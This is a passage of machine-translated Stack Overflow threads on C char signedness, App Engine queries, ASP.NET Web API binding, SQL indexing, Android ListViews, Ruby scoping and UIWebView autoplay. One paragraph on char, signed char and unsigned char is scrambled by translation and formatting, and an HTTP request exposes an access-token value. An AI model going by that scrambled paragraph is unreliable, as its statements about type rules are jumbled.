*   “包含”目录
*   “共享”目录

所以我留下了以下目录：

*   垃圾桶
*   ETC
*   图书馆（见上文）
*   模块

以上有什么不好的后果吗？我还能安全地删除什么？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-04-20T19:34:15.543

我坚持我发布的内容。一直在完美地工作。可能有机会削减更多，但建议的削减会导致占地面积小得多。

# c++ - 为什么 C 或 C++ 标准不明确将 char 定义为有符号或无符号？

> ID：15533115
> 
> 赞同：47
> 
> 时间：2013-03-20T19:38:22.853
> 
> 标签：c++, c, types, compiler-construction, standards

```
int main()
{
    char c = 0xff;
    bool b = 0xff == c;
    // Under most C/C++ compilers' default options, b is FALSE!!!
} 
```

C 或 C++ 标准都没有将 char 指定为有符号或无符号，它是实现定义的。

为什么 C/C++ 标准没有明确将 char 定义为有符号或无符号以避免像上面的代码这样的危险误用？

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2013-03-20T19:42:39.037

历史原因，主要是。

`char`在大多数情况下都会提升类型表达式`int`（因为很多 CPU 没有 8 位算术运算）。在某些系统上，符号扩展是执行此操作的最有效方式，它主张制作明文`char`签名。

另一方面，EBCDIC 字符集具有高位集的基本字符（即，值为 128 或更大的字符）；在 EBCDIC 平台上，`char`几乎必须是未签名的。

[ANSI C Rationale](http://www.lysator.liu.se/c/rat/title.html) （针对 1989 标准）在这个主题上没有太多可说的。第 3.1.2.5 节说：

> 指定了三种类型的 char：`signed`、plain 和`unsigned`. 一个plain`char`可以表示为有符号或无符号，这取决于实现，如在先前的实践中。引入该类型`signed char` 是为了在那些将普通 char 实现为无符号的系统上提供单字节有符号整数类型。出于对称原因，`signed`允许关键字作为其他整数类型的类型名称的一部分。

再往前追溯，1975 年的[C 参考手册的早期版本说：](http://cm.bell-labs.com/cm/cs/who/dmr/cman.pdf)

> 一个`char`对象可以在任何地方使用`int`。在所有情况下， 通过将其符号传播到结果整数的高 8 位，将其`char`转换为 an 。`int`这与用于字符和整数的二进制补码表示一致。（但是，符号传播功能在其他实现中消失了。）

这个描述比我们在后面的文档中看到的更具体，但它确实承认`char`可能是签名的或未签名的。在“符号传播消失”的“其他实现”中，将`char`对象提升为`int`将对 8 位表示进行零扩展，本质上将其视为 8 位无符号量。（该语言还没有`signed`or`unsigned`关键字。）

C 的直接前身是一种称为 B 的语言。B 是一种无类型语言，因此有`char`符号或无符号的问题不适用。有关 C 早期历史的更多信息，请参阅已故的 Dennis Ritchie 的~~[主页](http://www.cs.bell-labs.com/who/dmr/index.html)~~，现在[移至此处](https://www.bell-labs.com/usr/dmr/www/)。

至于您的代码中发生了什么（应用现代 C 规则）：

```
char c = 0xff;
bool b = 0xff == c; 
```

如果 plain`char`是无符号的，则初始化`c`将其设置为，在第二行`(char)0xff`中比较等于。`0xff`但是如果 plain`char`是有符号的，那么`0xff`（类型的表达式`int`）被转换为`char`-- 但由于`0xff`超过 CHAR_MAX（假设`CHAR_BIT==8`），结果是*实现定义的*。在大多数实现中，结果是`-1`。在比较`0xff == c`中，两个操作数都转换为`int`，使其等价于`0xff == -1`, 或`255 == -1`，这当然是错误的。

另一个需要注意的重要事情是`unsigned char`,`signed char`和 (plain)`char`是三种不同的类型。 *具有与**or*`char`相同的表示；它是由实现定义的。（另一方面，and是同一类型的两个名称；是不同的类型。（除了只是为了增加轻浮性，它是实现定义的，声明为普通的位字段是有符号的还是无符号的。）） *`unsigned char` *`signed char``signed int``int``unsigned int``int`**

 **是的，这有点乱，我敢肯定，如果今天从头开始设计 C，它的定义会有所不同。但是 C 语言的每个版本都必须避免破坏（太多）现有代码，以及在较小程度上破坏现有实现。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-19T15:02:54.323

`char`起初是为了存储字符，所以它是有符号还是无符号并不重要。真正重要的是如何`char`有效地进行数学运算。所以取决于系统，编译器会选择最合适的

> 在 ARMv4 之前，ARM 不支持加载半字和有符号字节。要加载有符号字节，您必须先使用 LDRB 然后对值进行符号扩展（LSL 向上然后 ASR 向下）。这很痛苦，因此默认情况下 char 是无符号的。
> 
> [为什么无符号类型在 arm cpu 中更有效？](https://stackoverflow.com/a/6532932/995714)

事实上，许多 ARM 编译器仍然`unsigned char`默认使用，因为即使您可以在现代 ARM ISA 上加载带有符号扩展的字节，该指令仍然不如零扩展版本灵活

*   [在 iOS 上默认是 char 签名还是 unsigned？](https://stackoverflow.com/q/20576300/995714)
*   [`char`默认情况`unsigned`下在 Android NDK 上](https://stackoverflow.com/a/2054959/995714)

而且大多数现代编译器还允许您更改 char 的符号而不是使用默认设置**

# python - App Engine 数据存储区不了解 Sql

> ID：15533121
> 
> 赞同：1
> 
> 时间：2013-03-20T19:38:53.423
> 
> 标签：python, google-app-engine, google-cloud-datastore

我有这两个数据存储：

```
class User(db.Model):
    name = db.StringProperty(required = True)
    password = db.StringProperty(required = True)
    email = db.EmailProperty(required = True)
    created = db.DateTimeProperty(auto_now_add = True)
    image = db.LinkProperty(required = True)

class Post(db.Model):
    post = db.StringProperty(required = True, multiline = True)
    submitter = db.IntegerProperty(required = True)
    receiver = db.IntegerProperty(required = True)
    created = db.DateTimeProperty(auto_now_add = True) 
```

但是问题是我生成了一个用户页面，其中显示了用户收到的所有帖子，但是我以非常 SQL 和幼稚的方式执行此操作，如下所示：

```
ret = []
    #Get all Posts
    for p in self.getPosts():
        #If the receiver of the post is equal to uId
        if str(p.receiver) == str(uId):

            #Get submitter Details
            sDetails = self.getUserDetails(p.submitter)

            #Check that details were received
            if sDetails:
                #Add needed Details to post
                p.sName = sDetails.name
                p.sId = str(sDetails.key().id())
                p.sImage = sDetails.image

                ret.append(p)
    return ret 
```

你们将如何改进这一点？在这种方法中我最讨厌的事情是必须通过每个帖子，这将导致系统变得非常慢一旦系统变大。

另请注意，所有帖子都存储在 memcache 中，因此我无法使用 GQL 来改善它。除非您有更好的想法将内容存储在 memcache 中，而不是我的方法……也就是说，将所有经常使用的查询放入其中，并在向数据存储添加新项目后更新缓存。

对于那些可能关注我的问题的人来说，这个项目是社交媒体的一个新概念，一旦完成就会发布一个链接:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T19:55:25.430

您不必每次都从数据库中获取所有帖子；使用过滤器查询来获取与特定用户 ID 匹配的所有帖子：

```
q = db.Query(Post)
q.filter('receiver =', uId) 
```

如果你现在不能这样做，因为你将每一篇文章都存储在一个内存缓存键下，也许你应该调整你的方法——它可能无法很好地扩展。使用上述查询，您可以利用 GAE 数据存储的索引和查询功能，这将始终优于直接迭代应用程序中的整个实体集。

我建议在从数据存储区生成用户页面*后将*它们存储在内存缓存中。

此外，在 上`Post`，您可以使用`db.ReferenceProperty`for`submitter`和`receiver`：

```
class Post(db.Model):
post = db.StringProperty(required = True, multiline = True)
submitter = db.ReferenceProperty(reference_class=User, required = True)
receiver = db.ReferenceProperty(reference_class=User, required = True)
created = db.DateTimeProperty(auto_now_add = True) 
```

[https://developers.google.com/appengine/docs/python/datastore/typesandpropertyclasses#ReferenceProperty](https://developers.google.com/appengine/docs/python/datastore/typesandpropertyclasses#ReferenceProperty)

# asp.net-mvc - 在 Web API 中未调用操作

> ID：15533123
> 
> 赞同：2
> 
> 时间：2013-03-20T19:39:01.667
> 
> 标签：asp.net-mvc, asp.net-mvc-4, asp.net-web-api, model-binding

我在使用 ASP.Net MVC 4 - Web API 时遇到了一些问题。

我的 API 控制器中有以下操作：

```
public void Post([FromBody] Integration integration)
{
    _repository.Add(integration);
} 
```

出于某种原因，我的断点`_repository.Add(integration);`从未通过。

这是我使用`WebClient`

```
POST https://ef52667f-3a6e-4a58-b548-e82b72186b5f.o365apps.net/api/integration HTTP/1.1
AccessToken: Vk1Ga4/L/BHYGNY1wVoq3tgGmVlu0YfPukZTlNqnFEK0HH
Content-Type: application/x-www-form-urlencoded
Host: ef52667f-3a6e-4a58-b548-e82b72186b5f.o365apps.net
Content-Length: 334
Expect: 100-continue

IntegrationId=c7456461-9e99-4e82-85d5-072670d270b5&Key=2999A604-30C9-423B-8500-8706673EEAFF&ApiUrl=https%3a%2f%2fapi.site.com%2fintegration.asmx&Web=https%3a%2f%2fsiteapp.sharepoint.com%2f&RemoteWeb=https%3a%2f%2ftesting.site.com%2fintegration%2f&ListName=Issues&IncomingAllowed=True&OutgoingAllowed=True&DeletionAllowed=True 
```

这是我得到的回复：

```
HTTP/1.1 500 Internal Server Error
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 36
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/7.5
Set-Cookie: ARRAffinity=5d9ceead697ee36c96ed0c04e0e51d80b3f1f3f7fced5c04c89cc370205e464d;Path=/;Domain=ef52667f-3a6e-4a58-b548-e82b72186b5f.o365apps.net
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
X-Powered-By: ARR/2.5
X-Powered-By: ASP.NET
Set-Cookie: WAWebSiteSID=3317c656d3214c81a19cbff73bb5d6cf; Path=/; HttpOnly
Date: Wed, 20 Mar 2013 20:02:44 GMT

{"Message":"An error has occurred."} 
```

有趣的是，我还有另一种类似的方法，效果很好：

```
public AuthResponse Post([FromBody] AuthRequest authRequest)
{
    var authResponse = new AuthResponse();

    try
    {
        . . .  
    }
    catch (Exception e)
    {
        authResponse.Success = false;
        authResponse.Message = e.Message;
    }

    return authResponse;
} 
```

我在这里错过了什么吗？

仅供参考，这是我的`Integration`模型：

```
[SharePointList("Integrations")]
public class Integration : Entity
{
    public Integration(int id) : base(id) { }

    public Integration() { }

    [Required]
    public string ApiUrl { get; set; }

    [Required]
    public bool DeletionAllowed { get; set; }

    [Required]
    public bool IncomingAllowed { get; set; }

    [IgnoreDataMember]
    [Required]
    public Guid IntegrationId { get; set; }

    [IgnoreDataMember]
    [Required]
    public string Key { get; set; }

    [Required]
    public string ListName { get; set; }

    [Required]
    public bool OutgoingAllowed { get; set; }

    [Required]
    public string RemoteWeb { get; set; }

    [Required]
    public string Web { get; set; }

    public override object this[string property]
    {
        get { return GetType().GetProperty(property).GetValue(this, null); }
        set
        {
            if (property.Equals("Id")) throw new Exception("Cannot set Id through an indexer.");

            if (property.Equals("IntegrationId"))
            {
                IntegrationId = new Guid((string) value);
                return;
            }

            if (property.Equals("Title"))
            {
                Key = value as string;
                return;
            }

            PropertyInfo propertyInfo = GetType().GetProperty(property);
            if (propertyInfo == null) throw new Exception(property + " is not a valid property.");

            propertyInfo.SetValue(this, value, null);
        }
    }
} 
```

**实体.cs**

```
public abstract class Entity : IEntity
{
    protected Entity(int id)
    {
        Id = id;
    }

    protected Entity() { }

    [IgnoreDataMember]
    public int Id { get; private set; }

    public abstract object this[string property] { get; set; }
} 
```

**IEntity.cs**

```
public interface IEntity
{
    int Id { get; }

    object this[string property] { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T22:18:05.997

涉及将 DataContract/DataMember 属性放在类/属性之上的解决方案不是问题的正确解决方案。

要摆脱 WCF 残留物，您需要做的是：

将此添加到您的 global.asax 中：

```
 GlobalConfiguration.Configuration.Services.RemoveAll(typeof(ModelValidatorProvider), v => v is InvalidModelValidatorProvider);
        GlobalConfiguration.Configuration.Formatters.JsonFormatter.RequiredMemberSelect‌or = new SuppressRequiredMemberSelector(); 
```

创建 SupressRequiredMemberSelector 类：

```
public class SuppressRequiredMemberSelector : IRequiredMemberSelector
{
    public bool IsRequiredMember(MemberInfo member)
    {
        return false;
    }
} 
```

这将解决您的问题而无需更改注释，并且被广泛接受的 Web API“错误修复”，因为它使用它提供的可扩展性，仅此而已。

# sql-server-2008 - 我可以为此查询创建什么索引？

> ID：15533125
> 
> 赞同：0
> 
> 时间：2013-03-20T19:39:08.500
> 
> 标签：sql-server-2008

我有下表：

```
CREATE TABLE [Cache].[Marker](
    [ID] [int] NOT NULL,
    [SubID] [varchar](15) NOT NULL,
    [ReadTime] [datetime] NOT NULL,
    [EquipmentID] [varchar](25) NULL,
    [Sequence] [int] NULL
) ON [PRIMARY] 
```

以及以下指标：

```
CREATE UNIQUE CLUSTERED INDEX [IX_Marker_EquipmentID_ReadTime_SubID] ON [Cache].[Marker] 
(
    [EquipmentID] ASC,
    [ReadTime] ASC,
    [SubID] ASC
)

CREATE NONCLUSTERED INDEX [IX_Marker_Id] ON [Cache].[Marker] 
(
    [ID] ASC
)
INCLUDE ( [EquipmentID]) 

CREATE NONCLUSTERED INDEX [IX_Marker_SubID] ON [Cache].[Marker] 
(
    [SubID] ASC
)
INCLUDE ( [EquipmentID],[ReadTime]) 
```

我正在执行以下查询：

```
Declare @EquipmentId varchar(50)

SELECT TOP 1 
    C44DistId,
    C471DistId,
    C473RightLotId
From Cache.vwMarker m
    INNER JOIN Cache.vwCoaterRecipe AS cr ON cr.MarkerId = m.ID AND M.EquipmentID = @EquipmentId
Order By m.Id Desc 
```

查询计划如下所示：

![在此处输入图像描述](../Images/7dcad6caf40a82b2ce1ff123e5c5d5d1.png)

Marker 表大约有 7M 行，因此扫描非常昂贵。7M 行中只有 24 个唯一的 EquipmentId 值，这可能是进行扫描的原因。

此查询通常需要 40 多秒才能执行，具体取决于服务器负载。我一直在想办法（通过创建某种索引）让 SQL Server 在 Marker 表上进行搜索。我什么都想不出来。也许没有办法，但我想我会先问。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:57:44.057

表上唯一`Marker`同时包含`EquipmentID`和`Id`列的索引是`IX_Marker_Id`. 由于该索引没有`EquipmentID`作为第一列，因此您无法对其进行搜索；您必须以相反的顺序扫描索引才能找到匹配的第一个条目`EquipmentID`。

这样的事情可能会有所帮助：

```
CREATE NONCLUSTERED INDEX [IX_Marker_EquipmentID_Id] ON [Cache].[Marker] 
(
   [EquipmentID] ASC,
   [ID] DESC
) 
```

* * *

**编辑：**当然，您的聚集索引包括两列，但只有 24 个不同的`EquipmentID`值，它必须扫描超过 290000 行才能找到最大值`Id`。通过反向扫描`IX_Marker_Id`索引，它可以在找到匹配时立即停止`EquipmentID`，这可能会更快。

# android - 如何在由联系人动态填充的自定义 ListView 中创建第二行？

> ID：15533126
> 
> 赞同：0
> 
> 时间：2013-03-20T19:39:08.800
> 
> 标签：android, contact, custom-lists

我有以下代码用于从本地数据库中获取联系人详细信息并将名称和号码分配给自定义 ListView

```
public class Rabtaye extends Activity {

    ListView msgList;
    ArrayList<MessageDetails> details;
    AdapterView.AdapterContextMenuInfo info;

    Cursor cursor;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.layout_main);

        msgList = (ListView) findViewById(R.id.MessageList);
        details = new ArrayList<MessageDetails>();

        MessageDetails Detail = new MessageDetails();

        // String info[] = { Phone.DISPLAY_NAME, Phone.NUMBER, Phone._ID };
        String number = null;
        String name = null;
        try {

            Cursor cursor = getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI, null, null, null,
                    null);
            while (cursor.moveToNext()) {
                String contactId = cursor.getString(cursor
                        .getColumnIndex(ContactsContract.Contacts._ID));
                String hasPhone = cursor
                        .getString(cursor
                                .getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                if (hasPhone.equals("1")) {
                    // You know it has a number so now query it like this
                    Cursor phones = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                                    + " = " + contactId, null, null);
                    while (phones.moveToNext()) {
                        number = phones
                                .getString(phones
                                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        name = phones
                                .getString(phones
                                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        System.out.println(number);

                    }
                    Detail.setName(name);
                    Detail.setNumber(number);
                    details.add(Detail);
                    msgList.setAdapter(new CustomAdapter(details, this));
                    phones.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        // Detail.setName(name);
        // Detail.setNumber(number);
        // details.add(Detail);

        msgList.setOnItemClickListener(new OnItemClickListener() {

            @Override
            public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
                    long arg3) {
                TextView s = (TextView) arg1.findViewById(R.id.name);
                String abc = s.getText().toString();
                Toast.makeText(Rabtaye.this, abc, Toast.LENGTH_LONG).show();
            }
        });
    }
} 
```

CustomAdapter 被传递给 ListAdapter。我也尝试在 while 循环中添加名称和编号，但每次只有一个名称和编号填充到 ListView 中。我对此有点困惑。请帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T21:04:53.733

这不是将光标绑定到 ListView 的方式。一般来说，如果您需要从多个光标列生成一个 UI 字段，或者如果您需要在将列数据绑定到字段之前对其进行处理，则只需要自定义 ListView。

CursorAdapter 将 Cursor 绑定到 ListView，但您还需要指定一个“项目布局”，该布局定义 ListView 中每个条目或项目的形式。对于 Cursor 中的每一行，CursorAdapter 将 Cursor 中所需的列绑定到项目布局中的字段。项目布局可以占据多于一行的 UI 屏幕；您需要做的就是以这种方式定义它。

我认为您要做的是为每个具有电话号码的联系人显示联系人姓名和电话号码。最好的方法是限制光标的内容，而不是在拥有光标后过滤数据。

问题是一个联系人可能有多个电话号码。为此*，*您可能需要一个自定义*适配器*，以编程方式将电话号码视图添加到父视图。这将允许您显示一次姓名以及所有电话号码。

# sql - 如果指定了 SELECT DISTINCT 错误，则 ORDER BY 项目必须出现在选择列表中

> ID：15533128
> 
> 赞同：4
> 
> 时间：2013-03-20T19:39:13.133
> 
> 标签：sql, tsql

我需要以某种方式列出一个字段，但对它进行不同的排序。这是查询。有什么办法吗？

```
SELECT DISTINCT tsgroup
FROM   master
ORDER  BY RIGHT(RTRIM(tsgroup), 3),
          LEFT(rtrim(tsgroup), 3) 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-20T19:41:12.410

您可以`GROUP BY` 改用

```
SELECT tsgroup
FROM   master
GROUP  BY tsgroup
ORDER  BY RIGHT(RTRIM(tsgroup), 3),
          LEFT(RTRIM(tsgroup), 3) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T19:41:31.720

就像一个黑客：

```
select grp from (
select distinct tsgroup as grp
from master 
)
order by RIGHT(RTRIM(grp), 3) , left(rtrim(grp), 3) 
```

# ruby - 我可以在 Ruby 中定义一个对其他范围隐藏的类吗？

> ID：15533129
> 
> 赞同：0
> 
> 时间：2013-03-20T19:39:14.870
> 
> 标签：ruby, scope

我想在 Ruby 中有多个可以执行任意代码的环境。这段代码可能定义了一个新类，我只希望这个新类在定义它的环境中可用。

例如，我想做这样的事情：

```
class Environment
  def evaluate(&code)
    # Evaluate the code in this environment.
  end
end

e1 = Environment.new
e2 = Environment.new

e1.evaluate do
  class InnerClass
    # ...
  end

  puts InnerClass.nil? # false
end

e2.evaluate do
  puts InnerClass.nil? # true
end 
```

我已经尝试`instance_eval`在 a 中使用和评估`Binding`，但是这些都不会隐藏其他环境中的类。有没有很好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:13:56.297

您可以`instance_eval`像这样使用动态类定义：

```
e1.instance_eval do
  innerClass = Class.new do
    # ...
  end
  puts innerClass.nil? # false
end

e2.instance_eval do
   innerClass.nil? # NameError, innerClass not defined
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-23T00:03:32.663

事实证明，`instance_eval`将工作。但是，为了将类包装在实例中，您需要提供字符串而不是块。一探究竟。

```
e1.instance_eval <<EOF
  class InnerClass
  end
  puts InnerClass.nil? # false
EOF

e2.instance_eval <<EOF
   InnerClass.nil? # NameError
EOF 
```

采用字符串的实现将所有内容包装在一个匿名类中，但采用块的实现却没有。

# iphone - 是否可以在没有触摸的情况下与 UIWebView 交互？

> ID：15533130
> 
> 赞同：5
> 
> 时间：2013-03-20T19:39:16.077
> 
> 标签：iphone, html, ios, url, uiwebview

我试图在不触摸屏幕的情况下与 UIWebView 中加载的页面进行交互。我试过 mediaplaybackrequiresuseraction 没有成功。我也尝试过[这里](https://stackoverflow.com/questions/5510429/how-can-i-start-a-youtube-video-without-the-user-touching-the-uiwebview-itself?lq=1)提供的方法，但显然它在 ios 6 中不起作用。我正在尝试加载[此](http://link.brightcove.com/services/player/bcpid1683318714001?bckey=AQ~~,AAAAC59qSJk~,vyxcsD3OtBPHZ2UIrFX2-wdCLTYNyMNn&bclid=1644543007001&bctid=2238216269001)url 并让播放器开始播放。有谁知道如何使这项工作 ios 6？任何帮助是极大的赞赏。

我的代码

```
 - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

  int storyIndex = [indexPath indexAtPosition: [indexPath length] - 1];

  NSString * storyLink = [[stories objectAtIndex: storyIndex] objectForKey: @"link"];
  //storyLink is various form of http://link.brightcove.com/services/player/bcpid1683318714001?bckey=AQ~~,AAAAC59qSJk~,vyxcsD3OtBPHZ2UIrFX2-wdCLTYNyMNn&bclid=1644543007001&bctid=2238216269001 with different bctid=value

  NSURL *kitcoURL = [NSURL URLWithString:storyLink];
  NSURLRequest *requestURL = [NSURLRequest requestWithURL:kitcoURL];
  [videoScreen setUserInteractionEnabled:YES];
  [videoScreen setMediaPlaybackRequiresUserAction:NO];
  [videoScreen loadRequest:requestURL];

 } 
```

//方法在ios6中不起作用

```
 - (UIButton *)findButtonInView:(UIView *)view {
UIButton *button = nil;

if ([view isMemberOfClass:[UIButton class]]) {
return (UIButton *)view;
}

if (view.subviews && [view.subviews count] > 0) {
for (UIView *subview in view.subviews) {
  button = [self findButtonInView:subview];
  if (button) return button;
}
}

return button;
}

- (void)webViewDidFinishLoad:(UIWebView *)_webView {
  UIButton *b = [self findButtonInView:_webView];
  [b sendActionsForControlEvents:UIControlEventTouchUpInside];
 } 
```

编辑 //videoScreen 是我的 UIWebView

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

NSString *urlString = @"http://link.brightcove.com/services/player/bcpid1683318714001?bckey=AQ~~,AAAAC59qSJk~,vyxcsD3OtBPHZ2UIrFX2-wdCLTYNyMNn&bclid=1644543007001&bctid=2238216269001";

NSError *error;
NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"bckey=([^&]*)" options:0 error:&error];
NSTextCheckingResult *match = [regex firstMatchInString:urlString options:0 range:NSMakeRange(0, urlString.length)];
NSString *bckey = [urlString substringWithRange:[match rangeAtIndex:1]];

regex = [NSRegularExpression regularExpressionWithPattern:@"bctid=([0-9]*)" options:0 error:&error];
match = [regex firstMatchInString:urlString options:0 range:NSMakeRange(0, urlString.length)];
NSString *bctid = [urlString substringWithRange:[match rangeAtIndex:1]];

NSString *newUrlString = [NSString stringWithFormat:@"http://c.brightcove.com/services/viewer/htmlFederated?&playerKey=%@&videoID=%@", bckey, bctid];

[videoScreen loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:newUrlString]]];

}

- (void)webViewDidFinishLoad:(UIWebView *)webView
{
if (!webView.isLoading)
{
    [self checkForVideoReady];
}

}
 // Checking player object for ready. If it ready - starting video. Otherwise waiting 1 second 
- (void)checkForVideoReady
{
    if (![[videoScreen stringByEvaluatingJavaScriptFromString:@"player.ready"]   isEqualToString:@"true"])
    {
    [self performSelector:@selector(checkForVideoReady) withObject:nil afterDelay:1];
   }
   else
   {
        [videoScreen stringByEvaluatingJavaScriptFromString:@"player.videoPlayer.playButton.element.click();"];
   }
 } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-23T06:55:44.507

如果你只想播放一首歌，当 webview 加载时。然后你需要调用 play 函数

```
 `- (void)webViewDidFinishLoad:(UIWebView *)webView {

    // Do whatever you want here
   // play song
}` 
```

但请确保您已像这样将委托分配给您的网络视图

```
<UIWebView_object>.delegate = self; 
```

这将在 webview 加载时自动播放歌曲

享受编程！！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-26T07:30:12.070

您可以在 Web 视图中加载的网页的 javascript 中设置“自动播放”“开启”。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-28T07:27:37.883

```
- (void)videoThumb:(NSString *)urlString frame:(CGRect)frame {
      NSString *embedHTML = @"\
      <html><head>\
      <style type=\"text/css\">\
      body {\
      background-color: transparent;
      color: white;
      }\
      </style>\
      </head><body style=\"margin:0\">\
      <embed id=\"yt\" src=\"%@\" type=\"application/x-shockwave-flash\" \
      width=\"%0.0f\" height=\"%0.0f\"></embed>\
      </body></html>";

   NSString *html = [NSString stringWithFormat:embedHTML, urlString, frame.size.width,frame.size.height];

  [webView loadHTMLString:html baseURL:nil];
  [self.view addSubview:webView];
  [webView release];
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    //Include above function to your page and call it by passing the urlstring
    //frame : this parameter needs the size of the thumb you want to use.
    [self videoThumb:url:frame];
} 
```

只需通过传递您想要播放的 url 来调用 videoThumb 函数并完成。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-26T07:09:11.417

您基于 HTML 5 Youtube 视频在视图中查找按钮的方法。
我为您的问题找到了解决方法，它并不优雅，但可以工作。

你的链接

> [http://link.brightcove.com/services/player/bcpid1683318714001?bckey=AQ~~,AAAAC59qSJk~,vyxcsD3OtBPHZ2UIrFX2-wdCLTYNyMNn&bclid=1644543007001&bctid=2238216269001](http://link.brightcove.com/services/player/bcpid1683318714001?bckey=AQ~~,AAAAC59qSJk~,vyxcsD3OtBPHZ2UIrFX2-wdCLTYNyMNn&bclid=1644543007001&bctid=2238216269001)

下载带有 Flash 对象的页面。据我所知，没有办法开始使用 JS 或`UIWebView`.
在研究了请求后，我看到`UIWebView`了另一个 url 的查询：

> [http://c.brightcove.com/services/viewer/htmlFederated?&width=966&height=546&flashID=myExperience&bgcolor=%23FFFFFF&playerID=1683318714001&playerKey=AQ~~%2CAAAAC59qSJk~%2CvyxcsD3OtBPHZ2UIrFX2-wdCLTYNyMNn&isVid=true&isUI=true&dynamicStreaming=true&autoStart=true&debuggerID=&videoID= 2238216269001&%40videoPlayer=2238216269001&lineupID=1644543007001&startTime=1364279975091&refURL=not%20available&%40videoPlayer=2238216269001](http://c.brightcove.com/services/viewer/htmlFederated?&width=966&height=546&flashID=myExperience&bgcolor=%23FFFFFF&playerID=1683318714001&playerKey=AQ~~%2CAAAAC59qSJk~%2CvyxcsD3OtBPHZ2UIrFX2-wdCLTYNyMNn&isVid=true&isUI=true&dynamicStreaming=true&autoStart=true&debuggerID=&videoID=2238216269001&%40videoPlayer=2238216269001&lineupID=1644543007001&startTime=1364279975091&refURL=not%20available&%40videoPlayer=2238216269001)

`player`第二个更有趣，因为我们可以使用 JavaScript访问变量并启动视频。

所以我们需要转换初始 URL。似乎我们在 URL 中只有 2 个重要参数 -`bckey`和`bctid`：

```
NSString *urlString = @"http://link.brightcove.com/services/player/bcpid1683318714001?bckey=AQ~~,AAAAC59qSJk~,vyxcsD3OtBPHZ2UIrFX2-wdCLTYNyMNn&bclid=1644543007001&bctid=2238216269001";

NSError *error;
NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"bckey=([^&]*)" options:0 error:&error];
NSTextCheckingResult *match = [regex firstMatchInString:urlString options:0 range:NSMakeRange(0, urlString.length)];
NSString *bckey = [urlString substringWithRange:[match rangeAtIndex:1]];

regex = [NSRegularExpression regularExpressionWithPattern:@"bctid=([0-9]*)" options:0 error:&error];
match = [regex firstMatchInString:urlString options:0 range:NSMakeRange(0, urlString.length)];
NSString *bctid = [urlString substringWithRange:[match rangeAtIndex:1]];

NSString *newUrlString = [NSString stringWithFormat:@"http://c.brightcove.com/services/viewer/htmlFederated?&playerKey=%@&videoID=%@", bckey, bctid]; 
```

并加载新的 URL

```
[_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:newUrlString]]]; 
```

加载 URL 后，我们可以访问`player`对象。该对象可以判断视频何时可以播放并开始播放

```
- (void)webViewDidFinishLoad:(UIWebView *)webView
{
    if (!webView.isLoading)
    {
        [self checkForVideoReady];
    }

}
// Checking player object for ready. If it ready - starting video. Otherwise waiting 1 second 
- (void)checkForVideoReady
{
    if (![[_webView stringByEvaluatingJavaScriptFromString:@"player.ready"] isEqualToString:@"true"])
    {
        [self performSelector:@selector(checkForVideoReady) withObject:nil afterDelay:1];
    }
    else
    {
        [_webView stringByEvaluatingJavaScriptFromString:@"player.videoPlayer.playButton.element.click();"];
    }
} 
```

我知道这并不优雅，也许有人会找到改进它的方法。
随意发表评论。

# python - 二叉搜索树中三种节点的计数（递归）

> ID：15533131
> 
> 赞同：2
> 
> 时间：2013-03-20T19:39:27.027
> 
> 标签：python, algorithm, data-structures, recursion, binary-search-tree

我正在尝试编写一个函数来计算 Python 中二叉搜索树中的三种类型的节点。它将计算并返回具有 0 个子节点、1 个子节点和 2 个子节点的节点总数。我注意到递归方法最适合这种方法，而不是迭代方法。

```
def node_counts(self):
    """
    ---------------------------------------------------------
    Returns the number of the three types of nodes in a BST.
    Use: zero, one, two = bst.node_counts()
    -------------------------------------------------------
    Postconditions:
      returns
      zero - number of nodes with zero children (int)
      one - number of nodes with one child (int)
      two - number of nodes with two children (int)
    ----------------------------------------------------------
    """
    zero, one, two = self._node_counts_aux(self._root)
    return zero, one, two

def _node_counts_aux(self, node):
    zero, one, two = 0, 0, 0
    if node is not None:
        if not node._right and not node._left:
            zero = 1 # I understand that the problem is here.
        if node._left and node._right:
            two = 1 + self._node_counts_aux(node._left)[2] + self._node_counts_aux(node._right)[2]
        if node._left or node._right:
            one = 1 + self._node_counts_aux(node._left)[1] + self._node_counts_aux(node._right)[1]
    return zero, one, two

"""
I am testing with this Tree:
        36
       /  \
      /    \
     6      50
    / \     / \
   4   17  49  84
       /   /   / \
      12  42  65 85

